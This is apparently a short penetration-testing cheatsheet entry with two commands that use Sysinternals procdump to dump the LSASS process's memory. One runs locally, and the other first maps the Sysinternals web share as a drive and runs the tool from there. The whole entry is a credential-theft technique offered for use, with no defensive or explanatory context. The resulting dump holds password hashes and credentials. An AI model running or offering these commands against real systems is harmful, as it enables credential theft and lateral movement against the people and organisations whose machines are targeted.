# procdump

% procdump, lsass, credentials

## procdump - dump lsass - local
```
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## procdump - dump lsass - remote
```
net use Z: https://live.sysinternals.com; Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
